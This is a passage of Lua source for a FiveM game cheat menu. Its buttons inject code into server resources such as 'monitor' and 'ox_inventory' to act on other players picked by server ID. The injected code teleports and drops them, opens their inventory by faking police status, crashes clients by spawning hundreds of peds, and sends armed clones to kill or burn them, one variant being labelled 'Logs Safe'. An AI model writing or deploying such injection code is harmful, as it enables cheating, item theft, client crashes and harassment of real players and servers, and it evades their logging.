                    NetworkRequestControlOfEntity(targetPed)
                    for i = 1, 10 do
                        ExecuteCommand("carry") 
                        DetachEntity(targetPed, true, true)
                        ClearPedTasksImmediately(targetPed)
                        SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                        Wait(10)
                    end
                end
                
                FreezeEntityPosition(myPed, false)
                SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                SetEntityVisible(myPed, true, false)
            end
        end
    ]], targetServerId)

    MachoInjectThread(0, resName, "", scriptToInject)
end)

MachoMenuButton(Tab3Group2, "Vine Wood Arch Drop", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local scriptToInject = string.format([[
        local targetId = %d
        local myPed = PlayerPedId()
        local oldCoords = GetEntityCoords(myPed)
        
        -- DITO MO ILAGAY KUNG SAAN MO GUSTO ITAPON (Chiliad, Maze, etc.)
        local destination = vector3(758.16, 1273.81, 446.19) 
        
        local targetIdx = GetPlayerFromServerId(targetId)
        if targetIdx ~= -1 then
            local targetPed = GetPlayerPed(targetIdx)
            if DoesEntityExist(targetPed) then
                -- 1. SYNC & ATTACH
                SetEntityVisible(myPed, false, false)
                local startPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, startPos.x, startPos.y, startPos.z, false, false, false)
                Wait(300)

                ExecuteCommand("carry")
                local attached = false
                for i = 1, 15 do
                    if IsEntityAttachedToEntity(targetPed, myPed) then
                        attached = true
                        break
                    end
                    Wait(60) 
                end

                -- 2. UNIVERSAL JUMP LOGIC (300m Segmented Travel)
                if attached then
                    local currentPos = startPos
                    local totalDist = #(currentPos - destination)
                    local maxJump = 250.0 -- Safe range para laging loaded ang target
                    local steps = math.ceil(totalDist / maxJump)
                    
                    for i = 1, steps do
                        -- Double Check: Pag nabitawan, teleport agad sa target para subukan i-re-attach
                        if not IsEntityAttachedToEntity(targetPed, myPed) then 
                            local rescuePos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, rescuePos.x, rescuePos.y, rescuePos.z, false, false, false)
                            Wait(100)
                            ExecuteCommand("carry")
                            Wait(100)
                        end
                        
                        -- Calculate next "Jump" point
                        local nextHop = startPos + (destination - startPos) * (i / steps)
                        
                        -- Pilitin ang world streaming ('true' parameter)
                        SetEntityCoordsNoOffset(myPed, nextHop.x, nextHop.y, nextHop.z, true, false, false)
                        
                        -- Importante ang Wait dito para makahabol ang server sync/assets
                        Wait(350) 
                    end
                    
                    -- Final positioning
                    Wait(200)
                    SetEntityCoordsNoOffset(myPed, destination.x, destination.y, destination.z, false, false, false)
                    FreezeEntityPosition(myPed, true)

                    -- 3. THE DROP
                    NetworkRequestControlOfEntity(targetPed)
                    for i = 1, 10 do
                        ExecuteCommand("carry") 
                        DetachEntity(targetPed, true, true)
                        ClearPedTasksImmediately(targetPed)
                        SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                        Wait(10)
                    end
                end
                
                -- 4. RETURN
                FreezeEntityPosition(myPed, false)
                SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                SetEntityVisible(myPed, true, false)
            end
        end
    ]], targetServerId)

    MachoInjectThread(0, resName, "", scriptToInject)
end)




MachoMenuButton(Tab3Group2, "Yatch Drop", function()
    local rawId = MachoMenuGetInputbox(PlayerInputBox)
    local targetServerId = tonumber(rawId)
    if not targetServerId then return end

    local resName = "monitor" 
    local scriptToInject = string.format([[
        local targetId = %d
        local myPed = PlayerPedId()
        local oldCoords = GetEntityCoords(myPed)
        
        -- DITO MO ILAGAY KUNG SAAN MO GUSTO ITAPON (Chiliad, Maze, etc.)
        local destination = vector3(-2075.78, -1021.28, 24.81) 
        
        local targetIdx = GetPlayerFromServerId(targetId)
        if targetIdx ~= -1 then
            local targetPed = GetPlayerPed(targetIdx)
            if DoesEntityExist(targetPed) then
                -- 1. SYNC & ATTACH
                SetEntityVisible(myPed, false, false)
                local startPos = GetEntityCoords(targetPed)
                SetEntityCoordsNoOffset(myPed, startPos.x, startPos.y, startPos.z, false, false, false)
                Wait(300)

                ExecuteCommand("carry")
                local attached = false
                for i = 1, 15 do
                    if IsEntityAttachedToEntity(targetPed, myPed) then
                        attached = true
                        break
                    end
                    Wait(60) 
                end

                -- 2. UNIVERSAL JUMP LOGIC (300m Segmented Travel)
                if attached then
                    local currentPos = startPos
                    local totalDist = #(currentPos - destination)
                    local maxJump = 250.0 -- Safe range para laging loaded ang target
                    local steps = math.ceil(totalDist / maxJump)
                    
                    for i = 1, steps do
                        -- Double Check: Pag nabitawan, teleport agad sa target para subukan i-re-attach
                        if not IsEntityAttachedToEntity(targetPed, myPed) then 
                            local rescuePos = GetEntityCoords(targetPed)
                            SetEntityCoordsNoOffset(myPed, rescuePos.x, rescuePos.y, rescuePos.z, false, false, false)
                            Wait(100)
                            ExecuteCommand("carry")
                            Wait(100)
                        end
                        
                        -- Calculate next "Jump" point
                        local nextHop = startPos + (destination - startPos) * (i / steps)
                        
                        -- Pilitin ang world streaming ('true' parameter)
                        SetEntityCoordsNoOffset(myPed, nextHop.x, nextHop.y, nextHop.z, true, false, false)
                        
                        -- Importante ang Wait dito para makahabol ang server sync/assets
                        Wait(350) 
                    end
                    
                    -- Final positioning
                    Wait(200)
                    SetEntityCoordsNoOffset(myPed, destination.x, destination.y, destination.z, false, false, false)
                    FreezeEntityPosition(myPed, true)

                    -- 3. THE DROP
                    NetworkRequestControlOfEntity(targetPed)
                    for i = 1, 10 do
                        ExecuteCommand("carry") 
                        DetachEntity(targetPed, true, true)
                        ClearPedTasksImmediately(targetPed)
                        SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                        Wait(10)
                    end
                end
                
                -- 4. RETURN
                FreezeEntityPosition(myPed, false)
                SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
                SetEntityVisible(myPed, true, false)
            end
        end
    ]], targetServerId)

    MachoInjectThread(0, resName, "", scriptToInject)
end)



MachoMenuButton(Tab3Group2, "Steal Inventory", function()

    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    
    if not inputId or inputId == 0 then return end

    MachoInjectResource2(3, "ox_inventory", string.format([[
        local tid = %d
        local myPed = PlayerPedId()
        
        local targetPlayer = -1
        local pList = GetActivePlayers()
        for i=1, #pList do
            if GetPlayerServerId(pList[i]) == tid then 
                targetPlayer = pList[i] 
                break 
            end
        end

        if targetPlayer ~= -1 then
            local tPed = GetPlayerPed(targetPlayer)
            local oldPos = GetEntityCoords(myPed)
            local oldHead = GetEntityHeading(myPed)
            local tPos = GetEntityCoords(tPed)
            local tForward = GetEntityForwardVector(tPed)

            SetEntityCoords(myPed, tPos.x - (tForward.x * 0.8), tPos.y - (tForward.y * 0.8), tPos.z - 1.0, false, false, false, false)
            SetEntityVisible(myPed, false, false)
            SetEntityAlpha(myPed, 0, false)
            SetEntityInvincible(myPed, true)
            FreezeEntityPosition(myPed, true)

            Wait(450)

            local PD = PlayerData or _G.PlayerData
            if PD then
                local oldGroups = PD.groups
                PD.groups = { ["police"] = 1 } 
                
                exports.ox_inventory:openInventory('player', tid)

                Citizen.CreateThread(function()
                    while IsNuiFocused() do Wait(500) end
                    
                    SetEntityCoords(myPed, oldPos.x, oldPos.y, oldPos.z, false, false, false, false)
                    SetEntityHeading(myPed, oldHead)
                    SetEntityVisible(myPed, true, false)
                    ResetEntityAlpha(myPed)
                    SetEntityInvincible(myPed, false)
                    FreezeEntityPosition(myPed, false)
                    
                    PD.groups = oldGroups
                end)
            end
        end
    ]], inputId))
end)

MachoMenuButton(Tab3Group1, "Crash Player", function()
    local targetId = MachoMenuGetSelectedPlayer()
    if not targetId or targetId == 0 or targetId == "" then
        targetId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    end
    
    if not targetId or targetId == 0 then return end

    local selectedModel = MachoMenuGetInputbox(NPCInputBox)
    if selectedModel == "" or selectedModel == "..." then selectedModel = "player_zero" end
    local pModel = GetHashKey(selectedModel)

    IsNuclearLoopActive = not IsNuclearLoopActive

    if IsNuclearLoopActive then
        MachoInjectResource2(3, "monitor", string.format([[
            _G.nukeLoop = _G.nukeLoop or {}
            local tID = %d
            local mH = %d
            _G.nukeLoop[tID] = true

            Citizen.CreateThread(function()
                RequestModel(mH)
                local wait = 0
                while not HasModelLoaded(mH) and wait < 50 do 
                    Wait(100) 
                    wait = wait + 1 
                end
                
                if not HasModelLoaded(mH) then return end

                while _G.nukeLoop[tID] do
                    local targetPed = 0
                    local players = GetActivePlayers()
                    
                    for i=1, #players do
                        local p = players[i]
                        if GetPlayerServerId(p) == tID then 
                            targetPed = GetPlayerPed(p) 
                            break 
                        end
                    end
                    
                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                        local pos = GetEntityCoords(targetPed)
                        
                        for i = 1, 500 do
                            if not _G.nukeLoop[tID] then break end
                            
                            local offsetX = math.random(-3, 3) + 0.0
                            local offsetY = math.random(-3, 3) + 0.0
                            
                            local ped = CreatePed(4, mH, pos.x + offsetX, pos.y + offsetY, pos.z, 0.0, true, true)
                            
                            if DoesEntityExist(ped) then
                                SetEntityAsMissionEntity(ped, true, true) 
                                SetPedCanRagdoll(ped, true)
                                SetBlockingOfNonTemporaryEvents(ped, true)
                            end

                            if i %% 10 == 0 then 
                                Wait(0) -- Hihinga ang engine mo ng 1 frame kada 10 peds
                            end
                        end
                        _G.nukeLoop[tID] = nil 
                    else
                        _G.nukeLoop[tID] = nil
                    end
                end
            end)
        ]], targetId, pModel))
    else
        MachoInjectResource2(3, "monitor", "_G.nukeLoop = {}")
    end
end)


MachoMenuButton(Tab3Group1, "Make Player Go Crazy", function()
    local targetId = MachoMenuGetSelectedPlayer()
    if not targetId or targetId == 0 or targetId == "" then
        targetId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    end
    if not targetId or targetId == 0 then return end

    IsNuclearLoopActive = not IsNuclearLoopActive
    
    local selectedModel = MachoMenuGetInputbox(NPCInputBox)
    if selectedModel == "" or selectedModel == "..." then selectedModel = "a_m_m_skater_01" end
    local pModel = GetHashKey(selectedModel)

    if IsNuclearLoopActive then
        MachoInjectResource2(3, "monitor", string.format([[
            _G.nukeLoop = _G.nukeLoop or {}
            local tID = %d
            local mH = %d
            _G.nukeLoop[tID] = true

            Citizen.CreateThread(function()
                RequestModel(mH)
                local wait = 0
                while not HasModelLoaded(mH) and wait < 50 do 
                    Wait(100) 
                    wait = wait + 1 
                end
                
                if not HasModelLoaded(mH) then return end

                while _G.nukeLoop[tID] do
                    local targetPed = 0
                    local players = GetActivePlayers()
                    
                    for i=1, #players do
                        local p = players[i]
                        if GetPlayerServerId(p) == tID or p == tID then 
                            targetPed = GetPlayerPed(p) 
                            break 
                        end
                    end
                    
                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                        local pos = GetEntityCoords(targetPed)
                        
                        for i = 1, 500 do
                            if not _G.nukeLoop[tID] then break end
                            
                            local offsetX = math.random(-5, 5) + 0.0
                            local offsetY = math.random(-5, 5) + 0.0
                            
                            local ped = CreatePed(4, mH, pos.x + offsetX, pos.y + offsetY, pos.z, 0.0, true, true)
                            
                            if DoesEntityExist(ped) then
                                SetPedCanRagdoll(ped, true)
                                SetEntityAsNoLongerNeeded(ped)
                            end
                            
                            Wait(10)
                        end
                        _G.nukeLoop[tID] = nil
                    else
                        _G.nukeLoop[tID] = nil
                    end
                end
            end)
        ]], targetId, pModel))
    else
        MachoInjectResource2(3, "monitor", "_G.nukeLoop = {}")
    end
end)

MachoMenuButton(Tab3Group1, "Attach All Vehicles", function()
    local tId = MachoMenuGetSelectedPlayer()
    if not tId or tId == 0 or tId == "" then
        tId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    end

    if not tId or tId == 0 then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local targetServerId = %d
        local targetPed = 0

        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == targetServerId or player == targetServerId then
                targetPed = GetPlayerPed(player)
                break
            end
        end

        if targetPed ~= 0 and DoesEntityExist(targetPed) then
            local tPos = GetEntityCoords(targetPed)
            local vehicles = GetGamePool('CVehicle')
            local currentVeh = GetVehiclePedIsIn(targetPed, false)

            for _, veh in ipairs(vehicles) do
                if DoesEntityExist(veh) and veh ~= currentVeh then
                    local vPos = GetEntityCoords(veh)
                    if #(tPos - vPos) <= 300.0 then
                        NetworkRequestControlOfEntity(veh)
                        AttachEntityToEntity(veh, targetPed, 0, 0.0, 0.0, 0.5, 0.0, 0.0, 0.0, true, true, false, false, 0, true)
                        FreezeEntityPosition(veh, true)
                    end
                end
            end
        end
    ]], tId))
end)


MachoMenuButton(Tab3Group1, "Spawn Props", function()
    local targetServerId = MachoMenuGetSelectedPlayer()
    if not targetServerId or targetServerId == 0 or targetServerId == "" then
        targetServerId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    end
    
    local propModel = MachoMenuGetInputbox(PropInputBox)
    if not targetServerId or targetServerId == 0 or not propModel or propModel == "" then return end

    MachoInjectResource("monitor", string.format([[  
        Citizen.CreateThread(function()
            local propHash = GetHashKey("%s")
            if not IsModelInCdimage(propHash) then return end
            RequestModel(propHash)
            local timeout = 0
            while not HasModelLoaded(propHash) and timeout < 50 do
                Wait(10)
                timeout = timeout + 1
            end
            local hasTrapped = false
            while not hasTrapped do
                Citizen.Wait(100)
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == %d then
                        local ped = GetPlayerPed(player)
                        if DoesEntityExist(ped) then
                            local coords = GetEntityCoords(ped)
                            local prop = CreateObject(propHash, coords.x, coords.y, coords.z - 1.0, true, true, false)
                            FreezeEntityPosition(prop, true)
                            hasTrapped = true
                        end
                        break
                    end
                end
                if not hasTrapped then break end
            end
            SetModelAsNoLongerNeeded(propHash)
        end)
    ]], propModel, targetServerId))
end)
    


MachoMenuButton(Tab3Group1, "Send Shooter", function()
    local selPlayer = MachoMenuGetSelectedPlayer()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local target = (inputId and inputId > 0) and inputId or selPlayer
    
    if not target or target == 0 then return end

    local rawModel = MachoMenuGetInputbox(NPCInputBox)
    local rawWeapon = MachoMenuGetInputbox(NPCWeaponBox)
    local customModel = (rawModel == "" or rawModel == "...") and "player_zero" or rawModel
    local weaponName = (rawWeapon == "" or rawWeapon == "...") and "weapon_carbinerifle" or rawWeapon

    MachoInjectResource2(3, "monitor", string.format([[
        local rawTarget = %d
        local modelHash = GetHashKey("%s")
        local weaponHash = GetHashKey("%s")
        local targetPed = 0

        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == rawTarget or player == rawTarget then
                targetPed = GetPlayerPed(player)
                break
            end
        end

        if targetPed ~= 0 and DoesEntityExist(targetPed) then
            RequestModel(modelHash)
            local t = 0
            while not HasModelLoaded(modelHash) and t < 50 do Wait(1) t = t + 1 end

            local pos = GetEntityCoords(targetPed)
            local shooter = CreatePed(4, modelHash, pos.x + 2.0, pos.y + 2.0, pos.z, 0.0, true, true)
            
            if DoesEntityExist(shooter) then
                SetEntityAsMissionEntity(shooter, true, true)
                GiveWeaponToPed(shooter, weaponHash, 9999, false, true)
                SetCurrentPedWeapon(shooter, weaponHash, true)
                SetCanAttackFriendly(shooter, true, true)
                SetPedRelationshipGroupHash(shooter, GetHashKey("HATES_PLAYER"))
                SetPedAccuracy(shooter, 100) 
                SetPedCombatAbility(shooter, 2)
                SetPedCombatAttributes(shooter, 46, true) 
                SetPedCombatAttributes(shooter, 5, true)  
                SetPedCombatAttributes(shooter, 2, true)  
                SetPedCombatMovement(shooter, 2) 
                SetPedCombatRange(shooter, 2) 
                ClearPedTasksImmediately(shooter)
                TaskCombatPed(shooter, targetPed, 0, 16)

                SetEntityAsNoLongerNeeded(shooter)
            end
        end
        SetModelAsNoLongerNeeded(modelHash)
    ]], target, customModel, weaponName))
end)


MachoMenuButton(Tab3Group1, "Attach NPC", function()
       local targetId = MachoMenuGetSelectedPlayer()
    if not targetId or targetId == 0 or targetId == "" then
        targetId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    end
    if not targetId or targetId == 0 then return end

    local selectedModel = MachoMenuGetInputbox(NPCInputBox)
    if selectedModel == "" or selectedModel == "..." then 
        selectedModel = "a_m_m_skater_01" 
    end
    local pModel = GetHashKey(selectedModel)


    MachoInjectResource2(3, "monitor", string.format([[
        local tID = %d
        local mH = %d
        local tP = 0
        local pList = GetActivePlayers()
 
        for i=1, #pList do
            local p = pList[i]
            if GetPlayerServerId(p) == tID or p == tID then tP = GetPlayerPed(p) break end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            RequestModel(mH)
            local timeout = 0
            while not HasModelLoaded(mH) and timeout < 50 do Wait(1) timeout = timeout + 1 end
            
            if HasModelLoaded(mH) then
                local pos = GetEntityCoords(tP)
                local npc = CreatePed(4, mH, pos.x, pos.y, pos.z, 0.0, true, true)
                
                if DoesEntityExist(npc) then
   
                    SetEntityAlpha(npc, 0, true) 
                    SetEntityVisible(npc, false, false)
            
                    SetEntityInvincible(npc, true)
                    SetPedCanRagdoll(npc, true)
                    SetBlockingOfNonTemporaryEvents(npc, true)

                    AttachEntityToEntity(npc, tP, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 0, true)
                    
                    SetEntityAsNoLongerNeeded(npc)
                    SetModelAsNoLongerNeeded(mH)
                end
            end
        end
    ]], targetId, pModel))
end)

MachoMenuButton(Tab3Group1, "Attach Twin (Clone)", function()
    local selPlayer = MachoMenuGetSelectedPlayer()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local target = (inputId and inputId > 0) and inputId or selPlayer
    if not target or target == 0 then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local rawTarget = %d
        local targetPed = 0

        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == rawTarget or player == rawTarget then
                targetPed = GetPlayerPed(player)
                break
            end
        end

        if targetPed ~= 0 and DoesEntityExist(targetPed) then
        
            local twin = ClonePed(targetPed, GetEntityHeading(targetPed), true, false)
            
            if DoesEntityExist(twin) then
                SetEntityVisible(twin, true, true)
                SetEntityAlpha(twin, 255, true)
                SetEntityInvincible(twin, true)
                SetBlockingOfNonTemporaryEvents(twin, true)
                SetPedCanRagdoll(twin, false)

               
                AttachEntityToEntity(twin, targetPed, 0, 0.0, -0.2, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 0, true)
                SetEntityAsMissionEntity(twin, true, true)
                TaskStandStill(twin, -1)
            end
        end
    ]], target))
end)

MachoMenuButton(Tab3Group1, "Evil Twin (Clone)", function()
    local selPlayer = MachoMenuGetSelectedPlayer()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local target = (inputId and inputId > 0) and inputId or selPlayer
    if not target or target == 0 then return end

    local rawWeapon = MachoMenuGetInputbox(NPCWeaponBox)
    local weaponName = (rawWeapon == "" or rawWeapon == "...") and "WEAPON_KNIFE" or rawWeapon

    MachoInjectResource2(3, "monitor", string.format([[
        local rawTarget = %d
        local weaponHash = GetHashKey("%s")
        local targetPed = 0

        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == rawTarget or player == rawTarget then
                targetPed = GetPlayerPed(player)
                break
            end
        end

        if targetPed ~= 0 and DoesEntityExist(targetPed) then

            local twin = ClonePed(targetPed, GetEntityHeading(targetPed), true, false)
            
            if DoesEntityExist(twin) then
                local pos = GetEntityCoords(targetPed)
                SetEntityCoords(twin, pos.x + 1.2, pos.y + 1.2, pos.z, false, false, false, true)
                SetEntityAsMissionEntity(twin, true, true)
                GiveWeaponToPed(twin, weaponHash, 1, false, true)
                SetCurrentPedWeapon(twin, weaponHash, true)
                SetCanAttackFriendly(twin, true, true)
                SetPedRelationshipGroupHash(twin, GetHashKey("HATES_PLAYER"))
                SetPedCombatAttributes(twin, 46, true)
                
                ClearPedTasksImmediately(twin)
                TaskCombatPed(twin, targetPed, 0, 16)
                
                SetEntityAsNoLongerNeeded(twin)
            end
        end
    ]], target, weaponName))
end)

MachoMenuButton(Tab3Group1, "Attach Prop", function()
    local targetServerId = MachoMenuGetSelectedPlayer()
    if not targetServerId or targetServerId == 0 or targetServerId == "" then
        targetServerId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    end
    
    local customProp = MachoMenuGetInputbox(PropInputBox) 
    if not targetServerId or targetServerId == 0 or not customProp or customProp == "" then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT, mH, tP = %d, GetHashKey("%s"), 0
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then tP = GetPlayerPed(p) break end
        end
        if tP ~= 0 and DoesEntityExist(tP) then
            if IsModelInCdimage(mH) then
                RequestModel(mH)
                local t = 0
                while not HasModelLoaded(mH) and t < 50 do Wait(1) t = t + 1 end
                if HasModelLoaded(mH) then
                    local coords = GetEntityCoords(tP)
                    local obj = CreateObject(mH, coords.x, coords.y, coords.z, true, true, false)
                    if DoesEntityExist(obj) then
                        AttachEntityToEntity(obj, tP, GetPedBoneIndex(tP, 31086), 0.0, 0.0, 0.2, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        SetModelAsNoLongerNeeded(mH)
                        SetEntityAsNoLongerNeeded(obj)
                    end
                end
            end
        end
    ]], targetServerId, customProp))
end)

MachoMenuButton(Tab3Group1, "Rogdoll Player", function()
    -- 1. Targeting Logic
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    -- 2. Injection Logic
    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local modelHash = GetHashKey("sultan")
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            Citizen.CreateThread(function()
                RequestModel(modelHash)
                local wait = 0
                while not HasModelLoaded(modelHash) and wait < 50 do Wait(10) wait = wait + 1 end

                if HasModelLoaded(modelHash) then
                    local coords = GetEntityCoords(tP)
                    
                    -- Spawn ng networked vehicle para ramdam ng target
                    local veh = CreateVehicle(modelHash, coords.x, coords.y, coords.z + 10.5, GetEntityHeading(tP), true, true)
                    
                    if DoesEntityExist(veh) then
                        -- [ ANTI-TUMAGOS SETTINGS ]
                        SetEntityAsMissionEntity(veh, true, true)
                        NetworkRegisterEntityAsNetworked(veh)
                        SetNetworkIdCanMigrate(VehToNet(veh), true)
                        
                        -- Force Collision laban sa Ped ng target
                        SetEntityCollision(veh, true, true) 
                        SetEntityVisible(veh, false, false)
                        SetEntityAlpha(veh, 0, false)
                        
                        -- Physics Boost
                        ActivatePhysics(veh)
                        SetEntityVelocity(veh, 0.0, 0.0, -50.0) -- Mas mabilis na bagsak para hindi tumagos
                        
                        -- Hayaan ang physics na mag-calculate bago burahin
                        local timer = GetGameTimer()
                        while GetGameTimer() - timer < 300 do 
                            Wait(0)
                            -- Paulit-ulit na i-set ang collision habang nahuhulog
                            SetEntityCollision(veh, true, true) 
                        end

                        if DoesEntityExist(veh) then 
                            DeleteVehicle(veh) 
                            SetEntityAsNoLongerNeeded(veh)
                        end
                    end
                    SetModelAsNoLongerNeeded(modelHash)
                end
            end)
        end
    ]], targetServerId))
end)

MachoMenuButton(Tab3Group1, "Taze Player", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "any", string.format([[
        local rT = %d
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                local coords = GetEntityCoords(tP)
                local forward = GetEntityForwardVector(tP)
                
                SetEntityCoords(twin, coords.x - (forward.x * 2.0), coords.y - (forward.y * 2.0), coords.z, false, false, false, true)
                
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityInvincible(twin, true)
                SetEntityCollision(twin, true, true) 
                SetBlockingOfNonTemporaryEvents(twin, true)
                
                local wH = GetHashKey("WEAPON_STUNGUN")
                GiveWeaponToPed(twin, wH, 999, false, true)
                SetCurrentPedWeapon(twin, wH, true)
                
                SetPedAccuracy(twin, 100)
                ClearPedTasksImmediately(twin)
                TaskShootAtEntity(twin, tP, 3000, 0xCC14B251)

                Citizen.SetTimeout(3500, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(Tab3Group1, "Kill Player", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        local me = GetPlayerPed(-1) 
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                local coords = GetEntityCoords(tP)
                local forward = GetEntityForwardVector(tP)
                local headCoords = GetPedBoneCoords(tP, 31086, 0.0, 0.0, 0.0)

                SetEntityCoords(twin, coords.x + (forward.x * 1.0), coords.y + (forward.y * 1.0), coords.z + 0.5, false, false, false, true)
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityCollision(twin, true, true)
                
                local wH = 0x1B06D571
                GiveWeaponToPed(twin, wH, 1, false, true)
                SetCurrentPedWeapon(twin, wH, true)

                ShootSingleBulletBetweenCoords(
                    coords.x + (forward.x * 0.9), coords.y + (forward.y * 0.9), coords.z + 0.6, 
                    headCoords.x, headCoords.y, headCoords.z, 
                    200,    
                    true,   
                    wH,     
                    me,    
                    true,  
                    false, 
                    1000.0  
                )

                
                Citizen.SetTimeout(500, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(Tab3Group1, "Kill Player (Logs Safe)", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then 
        return 
    end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) then
            local coords = GetEntityCoords(tP)
            local headCoords = GetPedBoneCoords(tP, 31086, 0.0, 0.0, 0.0)
            
            local twin = ClonePed(tP, GetEntityHeading(tP), true, false)
            
            if DoesEntityExist(twin) then
                SetEntityVisible(twin, false, false)
                SetEntityAlpha(twin, 0, false)
                SetEntityCollision(twin, false, false)
                
                SetEntityCoords(twin, coords.x, coords.y, coords.z - 5.0, false, false, false, true)
                
                local wH = 0x1B06D571
                GiveWeaponToPed(twin, wH, 1, false, true)
                SetCurrentPedWeapon(twin, wH, true)

                ShootSingleBulletBetweenCoords(
                    headCoords.x, headCoords.y, headCoords.z + 0.1, 
                    headCoords.x, headCoords.y, headCoords.z,       
                    200,   
                    true,   
                    wH, 
                    twin,   
                    true,   
                    false,  
                    1000.0  
                )
                Citizen.SetTimeout(200, function()
                    if DoesEntityExist(twin) then DeleteEntity(twin) end
                end)
            end
        end
    ]], targetServerId))
end)

MachoMenuButton(Tab3Group1, "Burn Player (Depends On City)", function()
    local inputId = tonumber(MachoMenuGetInputbox(PlayerInputBox))
    local selPlayer = MachoMenuGetSelectedPlayer()
    local targetServerId = (inputId and inputId > 0) and inputId or selPlayer

    if not targetServerId or targetServerId == 0 or targetServerId == "" then return end

    MachoInjectResource2(3, "monitor", string.format([[
        local rT = %d
        local tP = 0
        local me = PlayerPedId()
        
        for _, p in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(p) == rT or p == rT then 
                tP = GetPlayerPed(p) 
                break 
            end
        end

        if tP ~= 0 and DoesEntityExist(tP) and tP ~= me then
            SetEntityProofs(me, false, true, false, false, false, false, false, false)

            NetworkRequestControlOfEntity(tP)
            
            RequestNamedPtfxAsset("core")
            while not HasNamedPtfxAssetLoaded("core") do Wait(1) end

            local coords = GetEntityCoords(tP)
            
            UseParticleFxAssetNextCall("core")
            local pfx = StartNetworkedParticleFxLoopedOnEntity("fire_molotov", tP, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, false, false, false)
            
            StartScriptFire(coords.x, coords.y, coords.z, 25, false)
            StartEntityFire(tP)
            PlaySoundFromEntity(-1, "Glass_Crack", tP, "CONTACT_HELEN_SOUNDSET", true, 0)

            Citizen.CreateThread(function()
                local timer = 0
                while timer < 60 and not IsPedDeadOrDying(tP) do
                    if DoesEntityExist(tP) then
